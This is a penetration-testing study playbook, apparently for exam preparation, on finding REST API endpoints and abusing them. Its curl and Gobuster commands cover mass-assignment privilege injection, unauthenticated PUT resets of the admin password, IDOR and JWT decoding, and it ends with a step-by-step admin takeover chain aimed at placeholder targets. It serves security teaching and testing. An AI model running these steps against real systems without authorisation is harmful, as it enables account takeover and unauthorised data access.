# API Enumeration and Abuse

## TL;DR
Modern web applications communicate with their backends through APIs — 
structured HTTP endpoints that accept and return data, usually in JSON format.
APIs are frequently less hardened than the visible web application because
developers focus security testing on the UI layer. Black-box API testing
follows a four-phase workflow: discover endpoints, map their structure,
understand the HTTP methods they accept, then abuse logic flaws — particularly
around authentication, privilege, and parameter handling.

---

## What is an API?

An **API (Application Programming Interface)** is a defined set of endpoints
that a web application exposes so that different software components can
communicate with each other. When you click "Login" on a website, the browser
often does not submit a traditional HTML form — instead it calls an API:

```
Browser sends:
POST /api/v1/users/login
Content-Type: application/json

{"username": "admin", "password": "test"}

Server responds:
HTTP/1.1 200 OK
{"status": "success", "auth_token": "eyJ..."}
```

The user never sees this exchange — it happens behind the UI. This is why
APIs frequently contain vulnerabilities that the visible application does not:
they are designed for machine-to-machine communication, input validation is
often weaker, and developers assume only the legitimate frontend will call them.

### What is REST?

**REST (Representational State Transfer)** is the most common API design
pattern. REST APIs follow these conventions:

- Resources are represented as URL paths: `/users`, `/books`, `/orders`
- Actions on resources are expressed through HTTP methods (GET, POST, PUT etc.)
- Data is exchanged in JSON format
- Versioning appears in the path: `/api/v1/`, `/api/v2/`

Understanding this pattern tells you how to construct requests to probe
endpoints — you do not need documentation to figure out the structure.

---

## What is JSON?

**JSON (JavaScript Object Notation)** is the data format REST APIs use to
send and receive data. It is a structured text format built from key-value
pairs:

```json
{
  "username": "admin",
  "password": "secret",
  "email": "admin@corp.com",
  "admin": true
}
```

Rules you need to know for constructing API requests:
- Strings go in double quotes: `"value"`
- Numbers have no quotes: `42`
- Booleans are lowercase: `true` / `false`
- Arrays use square brackets: `["item1", "item2"]`
- Objects (nested data) use curly braces: `{"key": "value"}`

When sending JSON to an API via curl, you must:
1. Pass the JSON as the request body with `-d '{...}'`
2. Set the Content-Type header with `-H 'Content-Type: application/json'`

Without the Content-Type header, the server does not know the body is JSON
and may reject it or misparse it.

---

## HTTP Methods — The Full Picture for API Testing

Traditional web pages only use GET (load a page) and POST (submit a form).
REST APIs use a full set of methods, each with specific semantics:

| Method | Meaning | Typical API Use | When You Test It |
|--------|---------|-----------------|-----------------|
| `GET` | Read data | Fetch a resource or list | Default — curl uses this automatically |
| `POST` | Create data | Register user, submit data | Login, registration, create resource |
| `PUT` | Replace data | Replace entire resource | Update/overwrite a value — try when POST gives 405 |
| `PATCH` | Partial update | Modify one field of a resource | Alternative to PUT for updates |
| `DELETE` | Remove data | Delete a resource | Test if you can delete other users' data |
| `OPTIONS` | Query allowed methods | Server returns what methods are allowed | Use when you get 405 to find valid methods |

**The 405 pivot:** When a GET request to an endpoint returns `405 METHOD
NOT ALLOWED`, the endpoint exists but GET is not the right method. This
is your signal to try POST, PUT, and PATCH. The endpoint is real and
reachable — you just need the right verb.

```bash
# Discover which methods an endpoint actually accepts
curl -i -X OPTIONS http://<TARGET_IP>:<PORT>/api/v1/<endpoint>
# Response includes: Allow: GET, POST, PUT
```

---

## What is a JWT Token?

After a successful API login, servers frequently return a **JWT (JSON Web
Token)** as the authentication credential for subsequent requests.

A JWT looks like three base64-encoded chunks separated by dots:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsInN1YiI6ImFkbWluIn0.xyz
[    HEADER (algorithm)              ].[        PAYLOAD (claims)              ].[SIGNATURE]
```

**Decode the payload immediately** to read what it contains:

```bash
# Decode JWT payload (middle section)
echo "eyJleHAiOjE2NDkyNzEyMDEsInN1YiI6ImFkbWluIn0" | base64 -d 2>/dev/null
# Output: {"exp":1649271201,"sub":"admin"}
```

JWT payload commonly contains:
- `sub` → subject (username or user ID)
- `exp` → expiry timestamp
- `role` or `admin` → privilege level
- `iat` → issued-at timestamp

**Why this matters:** If the `role` or `admin` field is in the JWT payload
and the server does not properly validate the signature, you can potentially
modify the token. We cover JWT attacks in a separate playbook. For now,
always decode and read what the token contains.

**How to send a JWT in subsequent requests:**

```bash
curl -H 'Authorization: Bearer <JWT_TOKEN>' http://<TARGET>/api/v1/resource
# Some APIs use OAuth prefix instead of Bearer:
curl -H 'Authorization: OAuth <JWT_TOKEN>' http://<TARGET>/api/v1/resource
```

---

## API Naming Conventions — How to Guess Structure

REST APIs follow predictable patterns. Knowing them lets you guess endpoints
before brute forcing:

```
/api/<resource>/v<version>          → most common pattern
/api/v<version>/<resource>          → alternative ordering
/<resource>/v<version>              → no /api/ prefix

Resource names are usually plural nouns:
/users        → user management
/books        → book data
/orders       → order management
/products     → product catalogue
/admin        → admin functions
/auth         → authentication
/login        → login endpoint
/register     → registration endpoint
/password     → password management

Nested resources follow the parent:
/users/v1/admin/password     → admin user's password endpoint
/orders/v1/1234/items        → items in order 1234
```

---

## Phase 1 — Discover API Endpoints

### Gobuster with Pattern Files (API-Specific Discovery)

Standard Gobuster sends each wordlist entry as a bare path. For APIs,
you need to append version suffixes to each entry. Gobuster's `-p` (pattern)
flag automates this.

**Step 1 — Create a pattern file:**

```bash
cat > /tmp/api-patterns.txt << 'EOF'
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/v3
EOF
```

`{GOBUSTER}` is Gobuster's placeholder — it is replaced with each wordlist
entry. This means for each word (e.g. `users`), Gobuster tries:
- `/users/v1`
- `/users/v2`
- `/users/v3`

**Step 2 — Run Gobuster with the pattern:**

```bash
gobuster dir \
  -u http://<TARGET_IP>:<PORT> \
  -w /usr/share/wordlists/dirb/big.txt \
  -p /tmp/api-patterns.txt \
  -t 10 \
  -o gobuster-api-<TARGET_IP>.txt
```

Use `big.txt` instead of `common.txt` for API enumeration — API resource
names are more varied than common web paths.

**Also check non-standard ports:** APIs commonly run on:
```
5000, 5001, 5002 → Python Flask/Django dev APIs
3000             → Node.js APIs
8080, 8443       → Java Spring APIs
8000             → various
```

```bash
# Scan common API ports first
sudo nmap -p 5000,5001,5002,3000,8000,8080,8443 -sV <TARGET_IP>
```

**Step 3 — Look for the API documentation endpoint:**

Many APIs expose their documentation at standard paths. Finding it hands
you the entire endpoint map:

```bash
for path in /ui /swagger /api/docs /api/swagger /docs \
            /swagger-ui /api/v1/docs /openapi.json; do
  echo -n "$path: "
  curl -s -o /dev/null -w "%{http_code}" http://<TARGET_IP>:<PORT>$path
  echo
done
```

If any return 200, browse them immediately — API documentation is a complete
attack surface map in a white-box format.

---

## Phase 2 — Map the Endpoint Structure

Once you have discovered endpoints, probe each one to map its structure.

### Step 1 — Query a discovered endpoint with GET

```bash
# Basic enumeration — what does the endpoint return?
curl -i http://<TARGET_IP>:<PORT>/users/v1
```

`-i` includes response headers in output — always use it when exploring APIs,
the headers reveal server technology and auth requirements.

**What to look for in the response:**
- List of resources (usernames, IDs, emails) → user enumeration finding
- Field names in JSON keys → tells you what parameters the API accepts
- Admin accounts in user lists → high-value targets
- Any field that looks like a privilege indicator (`admin`, `role`, `is_staff`)

### Step 2 — Recurse into discovered resources

If `/users/v1` returns a list of users, extend the path with specific values:

```bash
# Get a specific user
curl -i http://<TARGET_IP>:<PORT>/users/v1/admin

# Try common sub-resources under a user
gobuster dir \
  -u http://<TARGET_IP>:<PORT>/users/v1/admin/ \
  -w /usr/share/wordlists/dirb/small.txt \
  -t 10
```

Sub-resources to look for under user endpoints:
```
/password     → password management
/email        → email change
/token        → token refresh
/role         → privilege management
/delete       → account deletion
/profile      → profile data
/2fa          → two-factor auth
```

---

## Phase 3 — Understand What Methods Are Accepted

### Decoding 405 Responses

A `405 METHOD NOT ALLOWED` is more useful than a `404`. It tells you:
1. The endpoint exists at this exact path
2. The HTTP method you used (probably GET) is not supported
3. Another method (POST, PUT) will work

```bash
# Test each method manually
for method in GET POST PUT PATCH DELETE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" \
    -X $method \
    -H 'Content-Type: application/json' \
    -d '{}' \
    http://<TARGET_IP>:<PORT>/users/v1/admin/password
  echo
done
```

### Decoding "404" Responses That Are Not Real 404s

APIs sometimes return 404 with a meaningful body:

```json
{"status": "fail", "message": "User not found"}
```

This is **not** a standard 404 — it is the API saying "I processed your
request, but no record matched." The endpoint exists and is functional.
You just need to provide a valid resource identifier.

Compare:
```
Real 404: endpoint does not exist — empty body or generic HTML error page
API "404": endpoint exists, resource not found — JSON body with message field
```

Always read the response body, not just the status code.

---

## Phase 4 — Abuse API Logic

### Attack 1 — Mass Assignment / Parameter Injection

**What it is:** When a registration or update API accepts a JSON body, it
may pass all received fields directly to the database model — including
fields the developer never intended users to supply. This is called **mass
assignment** or **parameter pollution**.

**How to discover it:**

1. Make a minimal valid request and note what fields are required
2. Add extra fields from the JSON keys you observed in GET responses
3. Look for privilege-related fields: `admin`, `role`, `is_admin`, `is_staff`

```bash
# Minimal registration — see what error says is required
curl -i \
  -d '{"username":"test","password":"test123"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/register

# If error says 'email is required', add it:
curl -i \
  -d '{"username":"test","password":"test123","email":"test@test.com"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/register

# Now inject privilege escalation field:
curl -i \
  -d '{"username":"test","password":"test123","email":"test@test.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/register
```

**Success indicators:**
- `{"status": "success"}` with no error mentioning the extra field → it was accepted
- No error = the field was processed. Test by logging in and using admin functions.

**Common privilege field names to inject:**
```
"admin": "True"
"admin": true
"role": "admin"
"is_admin": true
"is_staff": true
"user_type": "admin"
"privilege": 1
"level": 9
```

---

### Attack 2 — HTTP Method Switching to Modify Data

When GET is blocked (405) on a data-manipulation endpoint, try PUT:

```bash
# GET fails with 405 on a password endpoint
curl -i http://<TARGET_IP>:<PORT>/users/v1/admin/password

# Try PUT to overwrite the value
curl -i -X PUT \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <YOUR_JWT_TOKEN>' \
  -d '{"password": "newpassword123"}' \
  http://<TARGET_IP>:<PORT>/users/v1/admin/password
```

**Reading the result:**
- No response body + no error = likely succeeded (PUT often returns 204 No Content)
- Verify by logging in with the new password immediately after

---

### Attack 3 — Unauthenticated Access to Protected Endpoints

Try every sensitive endpoint without an Authorization header first. APIs
frequently have missing authentication checks on specific endpoints even
when other endpoints are protected:

```bash
# Test without auth token — should fail but might not
curl -i -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"password": "hacked"}' \
  http://<TARGET_IP>:<PORT>/users/v1/admin/password
```

If this succeeds — the endpoint has no authentication check. You can modify
any user's data without credentials.

---

### Attack 4 — IDOR via API (Insecure Direct Object Reference)

When an API returns data by ID, try accessing other users' data by changing
the ID:

```bash
# You are user ID 1001 — try accessing ID 1002
curl -i \
  -H 'Authorization: Bearer <YOUR_JWT_TOKEN>' \
  http://<TARGET_IP>:<PORT>/users/v1/1002/profile

# Try accessing admin (often ID 1 or 0)
curl -i \
  -H 'Authorization: Bearer <YOUR_JWT_TOKEN>' \
  http://<TARGET_IP>:<PORT>/users/v1/1/profile
```

---

## Complete API Attack Chain — Exam-Day Workflow

```bash
# 1. Scan for non-standard ports
sudo nmap -p 3000,5000,5001,5002,8000,8080,8443 -sV <TARGET_IP>

# 2. Check for API documentation first
curl -s -o /dev/null -w "%{http_code}" http://<TARGET_IP>:<PORT>/ui
curl -s -o /dev/null -w "%{http_code}" http://<TARGET_IP>:<PORT>/swagger

# 3. Gobuster with pattern file
cat > /tmp/api-patterns.txt << 'EOF'
{GOBUSTER}/v1
{GOBUSTER}/v2
EOF

gobuster dir \
  -u http://<TARGET_IP>:<PORT> \
  -w /usr/share/wordlists/dirb/big.txt \
  -p /tmp/api-patterns.txt \
  -t 10 -o gobuster-api-<TARGET_IP>.txt

# 4. Query each discovered endpoint
curl -i http://<TARGET_IP>:<PORT>/<endpoint>/v1

# 5. Recurse into resources — scan under specific items
gobuster dir \
  -u http://<TARGET_IP>:<PORT>/<endpoint>/v1/<resource>/ \
  -w /usr/share/wordlists/dirb/small.txt -t 10

# 6. Test 405 endpoints with all methods
for method in GET POST PUT PATCH DELETE; do
  echo -n "$method /endpoint: "
  curl -s -o /dev/null -w "%{http_code}" -X $method \
    -H 'Content-Type: application/json' -d '{}' \
    http://<TARGET_IP>:<PORT>/<endpoint>
  echo
done

# 7. Attempt registration with privilege injection
curl -i \
  -d '{"username":"<USER>","password":"<PASS>","email":"<EMAIL>","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/register

# 8. Login to obtain JWT
curl -i \
  -d '{"username":"<USER>","password":"<PASS>"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/login

# 9. Decode JWT payload
echo "<PAYLOAD_SECTION>" | base64 -d 2>/dev/null

# 10. Use JWT to modify privileged data
curl -i -X PUT \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <JWT>' \
  -d '{"password":"<NEWPASS>"}' \
  http://<TARGET_IP>:<PORT>/users/v1/admin/password

# 11. Verify by logging in as admin
curl -i \
  -d '{"username":"admin","password":"<NEWPASS>"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET_IP>:<PORT>/users/v1/login
```

---

## Routing API Testing Through Burp

All curl API commands can be proxied through Burp for visual inspection,
history logging, and easier Repeater/Intruder integration:

```bash
# Add --proxy to any curl command to route through Burp
curl -i \
  -d '{"username":"admin","password":"test"}' \
  -H 'Content-Type: application/json' \
  --proxy http://127.0.0.1:8080 \
  http://<TARGET_IP>:<PORT>/users/v1/login
```

Once in Burp HTTP History:
- Right-click → Send to Repeater → modify and iterate
- Right-click → Send to Intruder → brute force a field
- Check Target → Site Map → see full map of all API paths tested

---

## curl API Quick Reference

```bash
# GET request (default)
curl -i http://<TARGET>:<PORT>/api/v1/<resource>

# POST with JSON body
curl -i \
  -d '{"key":"value"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET>:<PORT>/api/v1/<resource>

# PUT request (replace/update)
curl -i -X PUT \
  -d '{"key":"value"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET>:<PORT>/api/v1/<resource>

# PATCH request (partial update)
curl -i -X PATCH \
  -d '{"key":"value"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET>:<PORT>/api/v1/<resource>

# DELETE request
curl -i -X DELETE http://<TARGET>:<PORT>/api/v1/<resource>/1

# With JWT auth
curl -i \
  -H 'Authorization: Bearer <JWT>' \
  http://<TARGET>:<PORT>/api/v1/<resource>

# With JWT + JSON body
curl -i -X PUT \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <JWT>' \
  -d '{"key":"value"}' \
  http://<TARGET>:<PORT>/api/v1/<resource>

# Via Burp proxy
curl -i --proxy http://127.0.0.1:8080 \
  -d '{"key":"value"}' \
  -H 'Content-Type: application/json' \
  http://<TARGET>:<PORT>/api/v1/<resource>
```

---

## Gotchas & Exam Tips

- **Always read the response body, not just the status code.** A JSON body
  with `"message": "User not found"` on a 404 response means the endpoint
  is real and functional — it just could not find what you asked for. This
  is completely different from a real 404 where the endpoint does not exist.

- **405 is a green flag.** It means the endpoint exists. Use OPTIONS or
  try all methods systematically. POST and PUT are the highest-probability
  alternatives when GET returns 405.

- **Empty response body on PUT = success.** PUT requests that succeed
  often return HTTP 200 or 204 with no body. The absence of an error
  message IS the success indicator. Verify by attempting a login with
  the modified credential.

- **Mass assignment works because developers trust their own frontends.**
  The UI only sends the fields it shows — but the API often accepts any
  field the database model has. Always inject privilege fields during
  registration and update operations.

- **Decode every JWT immediately.** The payload is not encrypted — only
  signed. Reading it tells you the user identity, privilege level, and
  expiry. On some misconfigured APIs the signature is never verified and
  you can modify the payload directly (JWT `alg:none` attack — separate
  playbook).

- **Use `big.txt` not `common.txt` for API brute forcing.** API resource
  names (users, books, orders, inventory, products) are domain-specific
  nouns that appear less in common.txt but are well represented in big.txt.

- **Always probe non-standard ports.** Flask development servers default
  to port 5000. Node.js to 3000. Spring Boot to 8080. An API running on
  a non-standard port is not indexed by standard web scanners and is often
  less hardened.

---

## Next Steps After API Enumeration

| Finding | Next Action |
|---|---|
| User list from GET `/users` | Add all usernames to credential attack list |
| Admin account identified | Target for privilege escalation or password reset |
| Registration with `admin:True` accepted | Login → use JWT → modify admin password |
| 405 on sensitive endpoint | Try all HTTP methods → especially PUT |
| JWT obtained | Decode payload → check for privilege fields → JWT attack playbook |
| API documentation found (`/ui`, `/swagger`) | Map all endpoints and parameters → systematic testing |
| IDOR vulnerability found | Enumerate all resource IDs → access other users' data |
